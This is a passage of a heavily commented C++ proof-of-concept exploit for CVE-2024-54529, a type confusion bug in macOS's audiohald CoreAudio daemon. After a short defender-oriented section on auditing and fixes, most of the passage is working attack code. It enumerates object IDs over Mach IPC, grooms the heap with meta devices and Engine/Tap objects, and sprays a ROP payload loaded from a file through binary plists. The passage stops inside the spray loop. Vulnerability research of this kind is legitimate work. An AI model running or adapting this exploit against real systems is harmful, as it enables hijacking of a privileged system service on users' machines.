 *   In CVE-2024-54529:
 *     - HALS_Object is fetched from ObjectMap by ID
 *     - Handler assumes object is type 'ioct' (IOContext)
 *     - Attacker provides ID of different object type
 *     - Handler dereferences at wrong offset â†’ vtable hijack
 *
 *   Why type confusion is powerful:
 *     1. Often deterministic (same input = same behavior)
 *     2. Can provide arbitrary read/write primitives
 *     3. May bypass ASLR if pointers are confused
 *     4. Frequently leads to code execution
 *
 * Reference: CWE-843 - Type Confusion
 *   https://cwe.mitre.org/data/definitions/843.html
 *
 * -----------------------------------------------------------------------------
 * 0.7 THE DEFENDER'S PERSPECTIVE
 * -----------------------------------------------------------------------------
 *
 * Understanding vulnerabilities helps build better defenses. Key questions:
 *
 *   BEFORE THE BUG WAS FOUND:
 *     Q: Could code review have caught this?
 *     A: Yes! The pattern "fetch object, assume type, dereference" is
 *        auditable. Static analysis could flag missing type checks.
 *
 *     Q: Could testing have caught this?
 *     A: Fuzzing with API call chaining did catch it. Unit tests with
 *        invalid object IDs might also have revealed the issue.
 *
 *     Q: Could design have prevented this?
 *     A: Yes! Strongly typed object handles (like typed file descriptors)
 *        would prevent passing wrong object types to handlers.
 *
 *   AFTER THE BUG WAS FOUND:
 *     Q: What was Apple's fix?
 *     A: Add explicit type checks before dereferencing objects.
 *        Simple but effective - verify the object type matches expectations.
 *
 *     Q: Are there similar bugs?
 *     A: Project Zero found multiple affected handlers. Systematic review
 *        of all CopyObjectByObjectID callers was needed.
 *
 *     Q: How to prevent future similar bugs?
 *     A: - Add type assertions to object fetching APIs
 *        - Use typed wrapper classes
 *        - Add fuzzing to CI/CD pipeline
 *        - Code review checklist for IPC handlers
 *
 * The goal of this case study is to help defenders understand:
 *   1. How attackers think about target selection
 *   2. What vulnerability classes to audit for
 *   3. How to write more secure IPC services
 *   4. What patterns indicate potential bugs
 *
 * =============================================================================
 * END OF PART 0: VULNERABILITY RESEARCH FOUNDATIONS
 * =============================================================================
 */

/*
 * CoreAudio Heap Exploitation PoC
 *
 * This exploit targets the macOS audiohald (Audio HAL Daemon) service.
 * It uses Mach IPC to communicate with com.apple.audio.audiohald and
 * exploits a memory corruption vulnerability in the workgroup port
 * fetching functionality.
 *
 * Exploitation strategy:
 *   1. Heap Grooming  - Spray controlled data (ROP payload) via plist allocations
 *   2. Hole Creation  - Free specific allocations to create predictable heap holes
 *   3. Object Reuse   - Create vulnerable Engine objects that land in controlled memory
 *   4. Trigger        - Invoke the vulnerable code path to hijack control flow
 */

/*
 * =============================================================================
 * HEADER IMPORTS - Function origins documented below
 * =============================================================================
 */

/*
 * CoreFoundation/CoreFoundation.h - Apple's core C framework for macOS/iOS
 * Provides:
 *   - CFArrayCreateMutable()      : Create mutable CFArray
 *   - CFArrayAppendValue()        : Append value to CFArray
 *   - CFStringCreateWithBytes()   : Create CFString from raw bytes
 *   - CFStringCreateWithCString() : Create CFString from C string
 *   - CFDictionaryCreateMutable() : Create mutable CFDictionary
 *   - CFDictionarySetValue()      : Set key-value in dictionary
 *   - CFPropertyListCreateData()  : Serialize plist to binary data
 *   - CFDataGetLength()           : Get length of CFData
 *   - CFDataGetBytePtr()          : Get raw pointer to CFData bytes
 *   - CFRelease()                 : Release CF object (decrement refcount)
 *   - CFShow()                    : Debug print CF object
 *   - kCFTypeArrayCallBacks       : Default callbacks for CFArray
 *   - kCFTypeDictionaryKeyCallBacks/ValueCallBacks : Default dict callbacks
 *   - kCFStringEncodingUTF8/UTF16LE : String encoding constants
 *   - kCFPropertyListBinaryFormat_v1_0 : Binary plist format
 */
#include <CoreFoundation/CoreFoundation.h>

/*
 * mach/mach.h - Mach kernel interface (master header)
 * Provides:
 *   - mach_msg()                  : Send/receive Mach IPC messages
 *   - mach_port_allocate()        : Allocate a new Mach port
 *   - mach_port_insert_right()    : Add send/receive rights to port
 *   - mach_port_deallocate()      : Release a port right
 *   - mach_task_self()            : Get port for current task
 *   - task_get_bootstrap_port()   : Get bootstrap port for service lookup
 *   - mach_error_string()         : Convert kern_return_t to string
 *   - MACH_PORT_NULL              : Null port constant
 *   - MACH_PORT_RIGHT_RECEIVE     : Receive right type
 *   - MACH_MSG_TYPE_COPY_SEND     : Copy send right on message send
 *   - MACH_MSG_TYPE_MAKE_SEND     : Create send right
 *   - MACH_MSG_TYPE_MOVE_SEND     : Transfer send right
 *   - MACH_SEND_MSG/MACH_RCV_MSG  : Message send/receive flags
 *   - MACH_SEND_TIMEOUT/MACH_RCV_TIMEOUT : Timeout flags
 *   - KERN_SUCCESS                : Success return code
 *   - mach_msg_header_t           : Message header structure
 *   - mach_msg_ool_descriptor_t   : Out-of-line memory descriptor
 *   - mach_msg_port_descriptor_t  : Port descriptor in message
 *   - MACH_MSGH_BITS_SET()        : Macro to set message header bits
 *   - MACH_MSGH_BITS_COMPLEX      : Flag for complex message (has descriptors)
 */
#include <mach/mach.h>

/*
 * stdio.h - Standard I/O
 * Provides:
 *   - printf()    : Formatted output to stdout
 *   - fprintf()   : Formatted output to file stream
 *   - stderr      : Standard error stream
 *   - setvbuf()   : Set stream buffering mode
 */
#include <stdio.h>

/*
 * stdlib.h - Standard library
 * Provides:
 *   - malloc()           : Allocate heap memory
 *   - free()             : Free heap memory
 *   - exit()             : Terminate process
 *   - strtoul()          : String to unsigned long conversion
 *   - arc4random_uniform() : Cryptographically secure random number (macOS)
 */
#include <stdlib.h>

/*
 * unistd.h - POSIX operating system API
 * Provides:
 *   - sleep()    : Sleep for seconds
 *   - usleep()   : Sleep for microseconds
 */
#include <unistd.h>

/*
 * launch.h - launchd interface (macOS)
 * Provides:
 *   - (included for completeness, not directly used here)
 */
#include <launch.h>

/*
 * string.h - String operations
 * Provides:
 *   - memset()   : Fill memory with byte value
 *   - memcpy()   : Copy memory
 *   - strcmp()   : Compare strings
 *   - strlen()   : Get string length
 *   - strdup()   : Duplicate string (allocates memory)
 */
#include <string.h>

/*
 * servers/bootstrap.h - Bootstrap server interface
 * Provides:
 *   - bootstrap_look_up() : Look up a Mach service by name
 *                          Returns a send right to the service port
 */
#include <servers/bootstrap.h>

/*
 * mach/vm_map.h - Virtual memory operations
 * Provides:
 *   - vm_allocate()   : Allocate virtual memory in a task
 *   - VM_FLAGS_ANYWHERE : Let kernel choose address
 */
#include <mach/vm_map.h>

/*
 * C++ Standard Library Headers
 */
#include <iostream>   // std::cout, std::cerr, std::endl
#include <sstream>    // std::ostringstream - string stream for building strings
#include <fstream>    // std::ifstream - file input stream
#include <cstring>    // C++ wrapper for string.h (std::memcpy, etc.)
#include <thread>     // std::thread (not used but included)
#include <vector>     // std::vector - dynamic array container
#include <mutex>      // std::mutex (not used but included)

// ANSI color codes for terminal output formatting
#define RESET   "\033[0m"
#define BOLD    "\033[1m"
#define RED     "\033[31m"
#define GREEN   "\033[32m"
#define YELLOW  "\033[33m"
#define BLUE    "\033[34m"
#define MAGENTA "\033[35m"
#define CYAN    "\033[36m"

// Starting point for object ID search (high value to avoid collisions)
#define HIGH_OBJECT_ID_THAT_IS_NOT_USED_YET 12000

// Mach message sizes for various CoreAudio IPC operations
#define XSYSTEM_OPEN_MSG_SIZE 0x38                        // Client initialization
#define XIOCONTEXT_FETCH_WORKGROUP_PORT_MSG_SIZE 0x24     // Vulnerability trigger
#define XSYSTEM_GET_OBJECT_INFO_SIZE 0x24                 // Object type query
#define XSYSTEM_CREATE_META_DEVICE_SIZE 0x38              // Meta device creation

// Target Mach service - the Audio HAL Daemon
const char *service_name = "com.apple.audio.audiohald";

// Heap spray configuration (set via command line)
uint32_t num_iterations = 0;        // Number of spray iterations
uint32_t allocs_per_iteration = 0;  // Allocations per iteration

// Object ID tracking for enumeration
uint32_t previous_next_object_id = 0;

// Mach ports for IPC communication
mach_port_t bootstrap_port = MACH_PORT_NULL;  // Bootstrap service port
mach_port_t service_port = MACH_PORT_NULL;    // audiohald service port

// Track created devices for later freeing (hole creation)
std::vector<uint32_t> created_devices = {};
uint32_t engine_object_id = 0;

/*
 * Mach Message Structures
 *
 * These structures define the IPC message formats for communicating with
 * audiohald. Each corresponds to a specific CoreAudio HAL operation.
 * The msgh_id field in the header identifies which handler processes the message.
 */

// Message ID 1010059: XIOContext_FetchWorkgroupPort
// This is the VULNERABLE message handler - triggers the memory corruption
typedef struct {
    mach_msg_header_t header;
    char body0[8];
    uint32_t object_id;  // Target object ID (Engine object for exploitation)
} xiocontext_fetch_workgroup_port_mach_message;

// Message ID 1010005: XSystem_CreateMetaDevice
// Creates aggregate/meta audio devices - used for heap grooming
typedef struct {
    mach_msg_header_t header;
    mach_msg_size_t msgh_descriptor_count;
    mach_msg_ool_descriptor_t descriptor[1];  // OOL plist data
    char body0[8];
    uint32_t plist_length;
} xsystem_createmetadevice_mach_message;

// Message ID 1010042: XObject_GetPropertyData with plist (selector 'mktp')
// Used to create Engine/Tap objects for exploitation
typedef struct {
    mach_msg_header_t header;
    mach_msg_size_t msgh_descriptor_count;
    mach_msg_ool_descriptor_t descriptor[1];  // OOL plist data
    char body0[8];
    uint32_t object_id;
    uint32_t mSelector;   // AudioObjectPropertySelector (e.g., 'mktp' = make tap)
    uint32_t mScope;      // AudioObjectPropertyScope (e.g., 'glob' = global)
    uint32_t mElement;    // AudioObjectPropertyElement
    uint32_t plist_length;
} xobject_getpropertydata_dcfstring_qplist_mach_message;

// Message ID 1010034: XObject_SetPropertyData with plist
// Used for heap spray (selector 'acom') and freeing allocations
typedef struct {
    mach_msg_header_t header;
    mach_msg_size_t msgh_descriptor_count;
    mach_msg_ool_descriptor_t descriptor[1];  // OOL plist data (contains ROP payload)
    char body0[8];
    uint32_t object_id;
    uint32_t mSelector;   // 'acom' for allocations
    uint32_t mScope;      // 'glob'
    uint32_t mElement;
    uint32_t plist_length;
} xobject_setpropertydata_dplist_mach_message;

// Message ID 1010002: XSystem_GetObjectInfo
// Queries object type - used for enumeration and verification
typedef struct {
    mach_msg_header_t header;
    char body0[8];
    uint32_t object_id;
} xsystem_getobjectinfo_mach_message;

// Message ID 1010000: XSystem_Open
// Client initialization - must be called before other operations
typedef struct {
    mach_msg_header_t header;
    mach_msg_size_t msgh_descriptor_count;
    mach_msg_port_descriptor_t descriptor[1];  // Send right for async notifications
    char body[];
} xsystemopen_mach_message;

/*
 * Creates a Mach port with both send and receive rights.
 * Used for bidirectional IPC communication with audiohald.
 */
mach_port_t create_mach_port_with_send_and_receive_rights() {
    mach_port_t port;
    kern_return_t kr;

    // mach_port_allocate() - <mach/mach.h>
    // mach_task_self() - <mach/mach.h> - returns port representing this process
    kr = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &port);
    if (kr != KERN_SUCCESS) {
        // fprintf() - <stdio.h>, mach_error_string() - <mach/mach.h>
        fprintf(stderr, RED "âŒ Failed to allocate port: %s\n" RESET, mach_error_string(kr));
        exit(1);  // exit() - <stdlib.h>
    }

    // mach_port_insert_right() - <mach/mach.h>
    kr = mach_port_insert_right(mach_task_self(), port, port, MACH_MSG_TYPE_MAKE_SEND);
    if (kr != KERN_SUCCESS) {
        fprintf(stderr, RED "âŒ Failed to insert send right: %s\n" RESET, mach_error_string(kr));
        exit(1);
    }

    return port;
}

/*
 * Generates a random alphanumeric string for unique device identifiers.
 * Each meta device needs a unique UID to be created.
 */
std::string generateRandomString(size_t length = 10) {
    const char charset[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
    std::string randomString;
    randomString.reserve(length);

    for (size_t i = 0; i < length; ++i) {
        randomString += charset[arc4random_uniform(sizeof(charset) - 1)];
    }

    return randomString;
}

/*
 * Generates the plist payload for creating a meta (aggregate) audio device.
 * Meta devices are used for heap grooming - each creation allocates memory.
 */
char *generateCreateMetaDevicePlist() {
    std::ostringstream plistStream;
    plistStream << "<?xml version=\"1.0\" encoding=\"UTF-8\"?>"
                    "<!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" "
                    "\"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">"
                    "<plist version=\"1.0\"><dict><key>name</key><string>Heap Grooming Device</string><key>stacked</key><true/><key>uid</key>";

    std::string uid = generateRandomString();

    plistStream << "<string>" << uid << "</string>";

    plistStream << "</dict></plist>";

    std::string plistString = plistStream.str();
    std::cout << CYAN "âš™ï¸  Creating Meta Device with uid: " << BOLD << uid << RESET << std::endl;
    return strdup(plistString.c_str());
}

/*
 * Generates the plist payload for creating an Engine/Tap object.
 * Engine objects (type "ngnejboa") contain the vulnerable code path.
 * The 'mktp' (make tap) selector creates these objects.
 */
char *generateCreateEnginePlist() {
    std::ostringstream plistStream;
    plistStream << "<?xml version=\"1.0\" encoding=\"UTF-8\"?>"
                    "<!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\" "
                    "\"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">"
                    "<plist version=\"1.0\"><dict><key>TapUUID</key><string>ExploitTap</string><key>IsMixdown</key><true/></dict></plist>";

    std::string plistString = plistStream.str();
    return strdup(plistString.c_str());
}

/*
 * Queries audiohald for the type of an object given its ID.
 * Returns an 8-byte type string (e.g., "ngnejboa" for Engine, "ggaaveda" for MetaDevice).
 * Used to enumerate objects and verify successful creation.
 * Sends message ID 1010002 (XSystem_GetObjectInfo).
 */
char * getObjectType(uint32_t object_id) {
    mach_msg_return_t result;
    xsystem_getobjectinfo_mach_message *msg = (xsystem_getobjectinfo_mach_message *)malloc(XSYSTEM_GET_OBJECT_INFO_SIZE);
    void *reply = malloc(100);
    memset(reply, 0xAA, 100);

    mach_port_t reply_port;
    kern_return_t kr;

    kr = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &reply_port);
    if (kr != KERN_SUCCESS) {
        fprintf(stderr, RED "âŒ Error allocating reply port: %s\n" RESET, mach_error_string(kr));
        return NULL;
    }
    
    // MACH_MSGH_BITS_SET() - <mach/mach.h> macro
    // Sets up message header bits: remote disposition, local disposition, voucher, other
    msg->header.msgh_bits = MACH_MSGH_BITS_SET(MACH_MSG_TYPE_COPY_SEND, MACH_MSG_TYPE_MAKE_SEND, MACH_PORT_NULL, MACH_PORT_NULL);
    msg->header.msgh_size = XSYSTEM_GET_OBJECT_INFO_SIZE;
    msg->header.msgh_remote_port = service_port;   // Send to audiohald
    msg->header.msgh_local_port = reply_port;      // Receive reply here
    msg->header.msgh_id = 1010002;                 // XSystem_GetObjectInfo

    msg->object_id = object_id;

    // mach_msg() - <mach/mach.h>
    // The core Mach IPC primitive - sends and/or receives messages
    // MACH_SEND_MSG: send the message
    // MACH_SEND_TIMEOUT: timeout after specified ms if can't send
    result = mach_msg(&msg->header, MACH_SEND_MSG | MACH_SEND_TIMEOUT, XSYSTEM_GET_OBJECT_INFO_SIZE, 0, MACH_PORT_NULL, 1000, MACH_PORT_NULL);
    if (result != MACH_MSG_SUCCESS) {
        free(msg);
        free(reply);
        return NULL;
    }

    // mach_msg() for receiving - MACH_RCV_MSG flag
    // Waits for a reply message on reply_port
    result = mach_msg((mach_msg_header_t *)reply, MACH_RCV_MSG | MACH_RCV_TIMEOUT, 0, 100, reply_port, 1000, MACH_PORT_NULL);
    if (result != MACH_MSG_SUCCESS) {
        free(msg);
        free(reply);
        return NULL;
    }

    // mach_port_deallocate() - <mach/mach.h>
    // Release the port right (decrements reference count)
    mach_port_deallocate(mach_task_self(), reply_port);

    free(msg);
    char *type = (char *)malloc(9);
    memcpy(type, (char *)reply+48, 8);
    type[8] = '\0';
    free(reply);

    return type;
}

/*
 * Finds the next available object ID by scanning backwards from a high ID.
 * Objects in audiohald are tracked by sequential IDs. This function finds
 * the highest currently allocated object (ends with "jboa" suffix) to
 * predict where the next allocation will land.
 */
uint32_t getNextObjectID() {
    if (!previous_next_object_id) previous_next_object_id = HIGH_OBJECT_ID_THAT_IS_NOT_USED_YET;
    for (uint32_t object_id = previous_next_object_id + 50; object_id > 32; object_id--) {
        char *object_type = getObjectType(object_id);

        // Check if this is a valid object (type string ends with "jboa")
        if (object_type && !strcmp("jboa", object_type+4)) {
            printf(GREEN "âœ… Found an object at object ID %d of type %s!\n" RESET, object_id, object_type);
            free(object_type);
            previous_next_object_id = object_id + 1;
            return object_id + 1;
        }
        free(object_type);
    }
    return 1;
}

/*
 * Allocates out-of-line (OOL) memory for Mach messages.
 * OOL memory is used to send large payloads (like plists) via Mach IPC.
 * The kernel maps this memory into the target process's address space.
 */
void *allocate_ool_memory(vm_size_t size, const char *data) {
    void *oolBuffer = NULL;
    // vm_allocate() - <mach/vm_map.h>
    // Allocates virtual memory pages in the current task
    // VM_FLAGS_ANYWHERE lets the kernel choose the address
    if (vm_allocate(mach_task_self(), (vm_address_t *)&oolBuffer, size, VM_FLAGS_ANYWHERE) != KERN_SUCCESS) {
        printf(RED "âŒ Failed to allocate memory buffer\n" RESET);
        return NULL;
    }

    memcpy(oolBuffer, data, size);

    return oolBuffer;
}

/*
 * Creates Engine/Tap objects that contain the vulnerable code path.
 * These are the objects that will be targeted when triggering the vulnerability.
 * Uses message ID 1010042 with selector 'mktp' (make tap).
 *
 * After heap grooming and freeing, these objects may land in controlled memory,
 * allowing the ROP payload to be executed when the bug is triggered.
 */
uint32_t createEngineObjects(uint32_t num_engine_objects) {
    for (uint32_t i = 0; i < num_engine_objects; i++) {
        uint32_t next_object_id = getNextObjectID() + 1;

        if (next_object_id == 1) {
            printf(RED "âŒ Error: Couldn't find the next Object ID...\n" RESET);
            exit(1);
        }
        
        xobject_getpropertydata_dcfstring_qplist_mach_message *msg = new xobject_getpropertydata_dcfstring_qplist_mach_message;
        kern_return_t result;

        msg->msgh_descriptor_count = 1;
        char *data = generateCreateEnginePlist();
        msg->descriptor[0].address = allocate_ool_memory(strlen(data) + 1, data);
        msg->descriptor[0].size = strlen(data) + 1;
        msg->descriptor[0].deallocate = 0;
        msg->descriptor[0].type = 1;
        msg->descriptor[0].copy = 1;
        
        msg->header.msgh_bits = MACH_MSGH_BITS_SET(MACH_MSG_TYPE_COPY_SEND, MACH_MSG_TYPE_MOVE_SEND, MACH_PORT_NULL, MACH_MSGH_BITS_COMPLEX);
        msg->header.msgh_size = sizeof(xobject_getpropertydata_dcfstring_qplist_mach_message);
        msg->header.msgh_remote_port = service_port;
        msg->header.msgh_local_port = MACH_PORT_NULL;
        msg->header.msgh_voucher_port = MACH_PORT_NULL;
        msg->header.msgh_id = 1010042;

        msg->plist_length = strlen(data) + 1;
        msg->object_id = 1;
        msg->mSelector = 'mktp';
        msg->mScope = 'glob';
        msg->mElement = 0;

        result = mach_msg(&msg->header, MACH_SEND_MSG | MACH_SEND_TIMEOUT, sizeof(xobject_getpropertydata_dcfstring_qplist_mach_message), 0, MACH_PORT_NULL, 5000, MACH_PORT_NULL);
        if (result != MACH_MSG_SUCCESS) {
            printf(RED "âŒ Mach message send failed for CreateMetaDevice %d\n" RESET, result);
            free(msg);
            return 1;
        }

        printf(YELLOW "ğŸ” Checking for successful creation of the Engine Device...\n" RESET);

        char *object_type = getObjectType(next_object_id);
        printf("Object type is: " BOLD "%s" RESET ", ", object_type);
        if (!strcmp(object_type, "ngnejboa")) {
            printf(GREEN "which looks good! âœ…\n" RESET);
        } else {
            printf(RED "which doesn't check out... âŒ\n" RESET);
        }

        engine_object_id = next_object_id;
        delete msg;
        free(data);
    }
    return 0;
}

/*
 * Creates a meta (aggregate) audio device for heap grooming.
 * Each meta device allocates memory in audiohald's heap.
 * By creating many of these, we fill the heap with known allocations.
 * Uses message ID 1010005 (XSystem_CreateMetaDevice).
 *
 * Returns the object ID of the created device (tracked for later freeing).
 */
uint32_t createMetaDevice() {
    uint32_t next_object_id = getNextObjectID();
    if (next_object_id == 1) {
        printf(RED "âŒ Error: Couldn't find the next Object ID...\n" RESET);
        exit(1);
    }

    xsystem_createmetadevice_mach_message *msg = new xsystem_createmetadevice_mach_message;
    kern_return_t result;

    msg->msgh_descriptor_count = 1;
    char *data = generateCreateMetaDevicePlist();
    msg->descriptor[0].address = allocate_ool_memory(strlen(data) + 1, data);
    msg->descriptor[0].size = strlen(data) + 1;
    msg->descriptor[0].deallocate = 0;
    msg->descriptor[0].type = 1;
    msg->descriptor[0].copy = 1;
    
    msg->header.msgh_bits = MACH_MSGH_BITS_SET(MACH_MSG_TYPE_COPY_SEND, MACH_MSG_TYPE_MOVE_SEND, MACH_PORT_NULL, MACH_MSGH_BITS_COMPLEX);
    msg->header.msgh_size = sizeof(xsystem_createmetadevice_mach_message);
    msg->header.msgh_remote_port = service_port;
    msg->header.msgh_local_port = MACH_PORT_NULL;
    msg->header.msgh_voucher_port = MACH_PORT_NULL;
    msg->header.msgh_id = 1010005;

    msg->plist_length = strlen(data) + 1;

    result = mach_msg(&msg->header, MACH_SEND_MSG | MACH_SEND_TIMEOUT, sizeof(xsystem_createmetadevice_mach_message), 0, MACH_PORT_NULL, 5000, MACH_PORT_NULL);
    if (result != MACH_MSG_SUCCESS) {
        printf(RED "âŒ Mach message send failed for CreateMetaDevice %d\n" RESET, result);
        free(msg);
        return 1;
    }

    printf(YELLOW "ğŸ” Checking for successful creation of the Meta Device...\n" RESET);

    char *object_type = getObjectType(next_object_id);
    printf("Object type is: " BOLD "%s" RESET ", ", object_type);
    if (!strcmp(object_type, "ggaaveda")) {
        printf(GREEN "which looks good! âœ…\n" RESET);
        created_devices.push_back(next_object_id);
    } else {
        printf(RED "which doesn't check out... âŒ\n" RESET);
        previous_next_object_id += 200;
    }

    delete msg;
    free(data);

    return next_object_id;
}

/*
 * Initializes a client session with audiohald.
 * Sends message ID 1010000 (XSystem_Open) to register as a client.
 * Must be called before any other operations can be performed.
 * Passes a send right that audiohald uses for async notifications.
 */
int sendInitializeClientMessage() {
    kern_return_t kr;
    xsystemopen_mach_message *xsystemopen_msg = (xsystemopen_mach_message *)malloc(XSYSTEM_OPEN_MSG_SIZE);
    mach_port_t reply_port;
    mach_port_t send_right_port = create_mach_port_with_send_and_receive_rights();

    xsystemopen_msg->msgh_descriptor_count = 1;
    xsystemopen_msg->descriptor[0].name = send_right_port;
    xsystemopen_msg->descriptor[0].disposition = MACH_MSG_TYPE_MOVE_SEND;
    xsystemopen_msg->descriptor[0].type = MACH_MSG_PORT_DESCRIPTOR;

    xsystemopen_msg->header.msgh_remote_port = service_port;
    xsystemopen_msg->header.msgh_voucher_port = MACH_PORT_NULL;
    xsystemopen_msg->header.msgh_id = 1010000;

    kr = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &reply_port);
    if (kr != KERN_SUCCESS) {
        fprintf(stderr, RED "âŒ Error allocating reply port: %s\n" RESET, mach_error_string(kr));
        return kr;
    }

    xsystemopen_msg->header.msgh_local_port = MACH_PORT_NULL;
    xsystemopen_msg->header.msgh_bits = MACH_MSGH_BITS_SET(MACH_MSG_TYPE_COPY_SEND, MACH_MSG_TYPE_MOVE_SEND, MACH_PORT_NULL, MACH_MSGH_BITS_COMPLEX);

    mach_msg_return_t result = mach_msg(&xsystemopen_msg->header, MACH_SEND_MSG | MACH_SEND_TIMEOUT, XSYSTEM_OPEN_MSG_SIZE, 0, send_right_port, 5000, MACH_PORT_NULL);

    free(xsystemopen_msg);

    if (result != KERN_SUCCESS) {
        fprintf(stderr, RED "âŒ Error sending Mach message: %s\n" RESET, mach_error_string(result));
        return 1;
    }

    mach_port_deallocate(mach_task_self(), send_right_port);

    printf(GREEN "ğŸ‰ XSystem_Open stage complete.\n" RESET);
    return 0;
}

// Base64 encoding table
static const char b64_table[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

// Standard base64 encoding (currently unused but available for plist encoding)
std::string base64_encode(const std::string& input) {
    std::string encoded;
    int val = 0, valb = -6;
    for (uint8_t c : input) {
        val = (val << 8) + c;
        valb += 8;
        while (valb >= 0) {
            encoded.push_back(b64_table[(val >> valb) & 0x3F]);
            valb -= 6;
        }
    }
    if (valb > -6) encoded.push_back(b64_table[((val << 8) >> (valb + 8)) & 0x3F]);
    while (encoded.size() % 4) encoded.push_back('=');
    return encoded;
}

/*
 * Generates a binary plist containing the ROP payload for heap spraying.
 *
 * The payload is loaded from "rop_payload.bin" (must be exactly 1152 bytes).
 * The raw bytes are converted to UTF-16LE strings and stored in a CFArray,
 * which is then serialized as a binary plist. This encoding allows arbitrary
 * binary data to survive plist parsing and land in audiohald's heap.
 *
 * The plist contains 'allocs_per_iteration' copies of the payload string,
 * creating multiple allocations per message to speed up heap spraying.
 */
char* generateAllocationPlistBinary(size_t& out_size) {
    const size_t payload_bytes = 1152;  // Required payload size (matches target allocation)

    // Load the ROP payload from disk
    std::ifstream ropFile("rop_payload.bin", std::ios::binary | std::ios::ate);
    if (!ropFile.is_open()) {
        std::cerr << RED << "âŒ Failed to open rop_payload.bin" << RESET << std::endl;
        return nullptr;
    }

    std::streamsize size = ropFile.tellg();
    if (size != payload_bytes) {
        std::cerr << RED << "âŒ rop_payload.bin must be exactly 1152 bytes, got " << size << RESET << std::endl;
        return nullptr;
    }

    ropFile.seekg(0, std::ios::beg);
    std::vector<uint8_t> raw_bytes(payload_bytes);
    if (!ropFile.read(reinterpret_cast<char*>(raw_bytes.data()), payload_bytes)) {
        std::cerr << RED << "âŒ Failed to read from rop_payload.bin" << RESET << std::endl;
        return nullptr;
    }
    ropFile.close();

    // Convert raw bytes to UTF-16LE for embedding in plist strings
    // std::memcpy() - <cstring>
    std::vector<uint16_t> payload_utf16;
    for (size_t i = 0; i < raw_bytes.size(); i += 2) {
        uint16_t val;
        std::memcpy(&val, &raw_bytes[i], 2);
        payload_utf16.push_back(val);
    }

    // CFArrayCreateMutable() - <CoreFoundation/CoreFoundation.h>
    // Creates a mutable array to hold our payload strings
    CFMutableArrayRef cfArray = CFArrayCreateMutable(NULL, 0, &kCFTypeArrayCallBacks);

    // Create multiple copies of the payload string for heap spray
    for (uint32_t i = 0; i < allocs_per_iteration; ++i) {
        std::vector<uint16_t> full_string;
        full_string.insert(full_string.end(), payload_utf16.begin(), payload_utf16.end());

        // CFStringCreateWithBytes() - <CoreFoundation/CoreFoundation.h>
        // Creates a CFString from raw UTF-16LE bytes (our ROP payload)
        CFStringRef strEntry = CFStringCreateWithBytes(NULL, reinterpret_cast<const UInt8*>(full_string.data()), full_string.size() * sizeof(uint16_t), kCFStringEncodingUTF16LE, false);

        if (strEntry) {
            // CFArrayAppendValue() - <CoreFoundation/CoreFoundation.h>
            CFArrayAppendValue(cfArray, strEntry);
            // CFRelease() - <CoreFoundation/CoreFoundation.h> - decrement refcount
            CFRelease(strEntry);
        } else {
            std::cerr << RED << "âŒ Failed to create CFString at index " << i << RESET << std::endl;
        }
    }

    // CFDictionaryCreateMutable() - <CoreFoundation/CoreFoundation.h>
    // Create dict with key "arr" -> array of payload strings
    CFMutableDictionaryRef dict = CFDictionaryCreateMutable(NULL, 0, &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
    // CFStringCreateWithCString() - <CoreFoundation/CoreFoundation.h>
    CFStringRef key = CFStringCreateWithCString(NULL, "arr", kCFStringEncodingUTF8);
    // CFDictionarySetValue() - <CoreFoundation/CoreFoundation.h>
    CFDictionarySetValue(dict, key, cfArray);
    CFRelease(key);
    CFRelease(cfArray);

    // CFPropertyListCreateData() - <CoreFoundation/CoreFoundation.h>
    // Serialize the dictionary to binary plist format
    // This is the key step: our ROP payload is now in a valid plist that audiohald will parse
    CFErrorRef error = NULL;
    CFDataRef binaryData = CFPropertyListCreateData(NULL, dict, kCFPropertyListBinaryFormat_v1_0, 0, &error);
    CFRelease(dict);

    if (!binaryData) {
        // CFShow() - <CoreFoundation/CoreFoundation.h> - debug print
        if (error) CFShow(error);
        return nullptr;
    }

    // CFDataGetLength() - <CoreFoundation/CoreFoundation.h>
    out_size = CFDataGetLength(binaryData);
    // malloc() - <stdlib.h>
    char* out = static_cast<char*>(malloc(out_size));
    // CFDataGetBytePtr() - <CoreFoundation/CoreFoundation.h> - get raw bytes
    // memcpy() - <string.h>
    memcpy(out, CFDataGetBytePtr(binaryData), out_size);

    CFRelease(binaryData);
    return out;
}

/*
 * Performs heap spray by sending plist payloads to audiohald.
 *
 * Each iteration:
 *   1. Creates a new meta device
 *   2. Sets property data on it with selector 'acom'
 *   3. The plist contains arrays of strings with embedded ROP payload
 *
 * This fills the heap with controlled data at predictable sizes.
 * Uses message ID 1010034 (XObject_SetPropertyData).
 */
int doAllocations(int num_iterations) {
    for (int allocation_count = 0; allocation_count < num_iterations; allocation_count++) {
        printf("ğŸŒŠ Spraying iteration %d/%d (%d allocations via plist)...\n", allocation_count + 1, num_iterations, allocs_per_iteration);
        xobject_setpropertydata_dplist_mach_message *msg = new xobject_setpropertydata_dplist_mach_message;
        msg->msgh_descriptor_count = 1;

        size_t data_size = 0;
        char *data = generateAllocationPlistBinary(data_size);

        msg->descriptor[0].address = allocate_ool_memory(data_size, data);
        msg->descriptor[0].size = data_size;
        msg->descriptor[0].deallocate = 0;
        msg->descriptor[0].type = 1;
        msg->descriptor[0].copy = 1;

        msg->header.msgh_bits = MACH_MSGH_BITS_SET(MACH_MSG_TYPE_COPY_SEND, MACH_MSG_TYPE_MAKE_SEND_ONCE, MACH_PORT_NULL, MACH_MSGH_BITS_COMPLEX);
        msg->header.msgh_size = sizeof(xobject_setpropertydata_dplist_mach_message);
        msg->header.msgh_remote_port = service_port;
        msg->header.msgh_local_port = MACH_PORT_NULL;
        msg->header.msgh_voucher_port = MACH_PORT_NULL;
        msg->header.msgh_id = 1010034;
        
        msg->object_id = createMetaDevice();
        msg->mSelector = 'acom';
        msg->mScope = 'glob';
        msg->mElement = 0;
        msg->plist_length = data_size;

